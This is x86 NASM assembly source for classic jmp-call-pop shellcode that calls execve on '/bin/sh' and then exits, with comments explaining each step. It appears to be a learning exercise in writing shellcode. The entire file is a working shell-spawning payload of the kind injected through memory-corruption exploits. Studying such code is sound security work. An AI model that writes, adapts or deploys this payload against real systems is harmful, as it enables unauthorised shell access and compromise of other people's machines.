section .data

global _start

_start:
    ; Jumps to label cmd
    jmp short cmd

pop_shell:
    ; Zeroes eax - edx
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
    xor edx, edx

    pop esi
    mov byte [esi + 7], bl      ; Stores a single null byte 0x00 at A 
    mov dword [esi + 8], esi    ; Stores Address of esi at B ->
    ;mov dword [esi + 12], ebx   ; Stores a double word 0x00000000 at C

    mov al, 0xB         ; Syscall # for execve()
    lea ebx, [esi]      ; ebx = "/bin/sh" string
    lea ecx, [esi + 8]  ; ecx = Address of "/bin/sh" string
   
    int 0x80            ; Calls kernel

exit:   
    mov al, 0x1         ; Syscall # for exit()
    mov bl, 0xFF        ; exit = 255

    int 0x80            ; Calls kernel

cmd:
    ; When label pop_shell is called, the address of the next instruction,
    ; in this case, "/bin/shABBBBCCCC" is stored in the stack
    call pop_shell

    ;binSH: db "/bin/shABBBBCCCC"
    binSH: db "/bin/shABBBB"
